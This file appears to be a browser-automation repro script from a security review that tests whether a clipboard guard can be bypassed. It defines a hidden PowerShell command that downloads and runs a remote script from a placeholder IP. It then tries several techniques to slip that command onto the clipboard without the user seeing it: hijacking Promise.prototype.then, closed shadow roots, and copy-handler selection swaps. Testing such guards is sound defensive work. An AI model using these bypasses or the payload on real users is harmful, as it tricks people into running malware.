import { start } from "docs/review-2026-11-16/repros/guards-lens/harness.mjs";
const CMD = "powershell -w hidden -nop -c \"iex (iwr 'http://203.0.113.5/a.ps1')\"";
const page0 = `<!doctype html><body><p id=safe>Hello world, this is plain text.</p><button id=b>go</button>
<div id=host></div><span id=cmdspan style="position:fixed;left:-9999px">${CMD.replace(/"/g,"&quot;")}</span><script>
window.CMD=${JSON.stringify(CMD)};
</script>`;
const { ctx, base, close } = await start({ "/": page0 });
const page = await ctx.newPage();
page.on("console", (m) => { if (!m.text().includes("404")) console.log("   console:", m.text()); });
await page.goto(base + "/");
await page.waitForTimeout(300);
async function attempt(name, fn, how = "click") {
  await page.evaluate(() => navigator.clipboard.writeText("clean"));
  await page.evaluate(`document.getElementById('b').onclick = ${fn}; 0`);
  if (how === "click") await page.click("#b");
  else await how();
  await page.waitForTimeout(500);
  const got = await page.evaluate(() => navigator.clipboard.readText());
  console.log(name.padEnd(46), got === CMD ? "COMMAND WRITTEN (bypass)" : "blocked/other: " + JSON.stringify(got).slice(0, 50));
}
await attempt("A write() + Promise.prototype.then hijack", `() => {
  const realThen = Promise.prototype.then;
  const clean = new Blob(['hello'], {type:'text/plain'});
  let n = 0;
  Promise.prototype.then = function (ok, bad) {
    // Only rewrite results that are Blobs or strings coming out of getType/text
    return realThen.call(this, (v) => {
      if (v instanceof Blob && v.size > 20) v = clean;
      else if (typeof v === 'string' && v.length > 20 && v.includes('powershell')) v = 'hello';
      return ok ? ok(v) : v;
    }, bad);
  };
  navigator.clipboard.write([new ClipboardItem({'text/plain': new Blob([CMD],{type:'text/plain'})})])
    .then(() => console.log('write ok'), (e) => console.log('rej', e.name))
    .finally?.(() => {});
  setTimeout(() => { Promise.prototype.then = realThen; }, 300);
}`);
await attempt("A2 write() + Promise.prototype.constructor", `() => {
  const realThen = Promise.prototype.then;
  const clean = new Blob(['hello'], {type:'text/plain'});
  Object.defineProperty(Promise.prototype, 'constructor', { get() { return Object; }, configurable: true });
  Promise.prototype.then = function (ok, bad) {
    return realThen.call(this, (v) => ok ? ok((v instanceof Blob && v.size > 20) ? clean : (typeof v==='string' && v.includes('powershell') ? 'hello' : v)) : v, bad);
  };
  navigator.clipboard.write([new ClipboardItem({'text/plain': new Blob([CMD],{type:'text/plain'})})]);
  setTimeout(() => { Promise.prototype.then = realThen; delete Promise.prototype.constructor; Promise.prototype.constructor = Promise; }, 300);
}`);
await attempt("B textarea in shadow root + execCommand", `() => {
  const h = document.getElementById('host'); const r = h.shadowRoot || h.attachShadow({mode:'closed'});
  const ta = document.createElement('textarea'); ta.value = CMD; ta.style.cssText='position:fixed;left:-9999px'; r.appendChild(ta);
  ta.focus(); ta.select();
  console.log('B toString=', JSON.stringify(getSelection().toString().slice(0,10)), 'active=', document.activeElement && document.activeElement.id);
  console.log('B exec=', document.execCommand('copy'));
  ta.remove();
}`);
await attempt("C selection inside shadow root + execCommand", `() => {
  const h = document.createElement('div'); document.body.appendChild(h); const r = h.attachShadow({mode:'closed'});
  const s = document.createElement('span'); s.textContent = CMD; r.appendChild(s);
  const rg = document.createRange(); rg.selectNodeContents(s); const sel = getSelection(); sel.removeAllRanges(); sel.addRange(rg);
  console.log('C toString=', JSON.stringify(getSelection().toString().slice(0,10)));
  console.log('C exec=', document.execCommand('copy'));
}`);
await attempt("D copy handler swaps selection after guard", `() => {
  const safe = document.getElementById('safe');
  const sel = getSelection(); sel.removeAllRanges(); const rg = document.createRange(); rg.selectNodeContents(safe); sel.addRange(rg);
  document.addEventListener('copy', function h() {
    document.removeEventListener('copy', h);
    const r2 = document.createRange(); r2.selectNodeContents(document.getElementById('cmdspan'));
    sel.removeAllRanges(); sel.addRange(r2);
  });
  console.log('D exec=', document.execCommand('copy'));
}`);
await attempt("E Ctrl+C on safe text, handler swaps selection", `() => {}`, async () => {
  await page.evaluate(() => {
    const safe = document.getElementById('safe');
    const sel = getSelection(); sel.removeAllRanges(); const rg = document.createRange(); rg.selectNodeContents(safe); sel.addRange(rg);
    document.addEventListener('copy', function h() {
      document.removeEventListener('copy', h);
      const r2 = document.createRange(); r2.selectNodeContents(document.getElementById('cmdspan'));
      sel.removeAllRanges(); sel.addRange(r2);
    });
  });
  await page.keyboard.press("Control+c");
});
await attempt("F textarea field: handler moves field selection", `() => {
  const ta = document.createElement('textarea'); ta.value = 'hello there friend\\n' + CMD; ta.style.cssText='position:fixed;left:-9999px'; document.body.appendChild(ta);
  ta.focus(); ta.setSelectionRange(0, 5);
  document.addEventListener('copy', function h() { document.removeEventListener('copy', h); ta.setSelectionRange(19, ta.value.length); });
  console.log('F exec=', document.execCommand('copy'));
  setTimeout(()=>ta.remove(), 100);
}`);
await close();
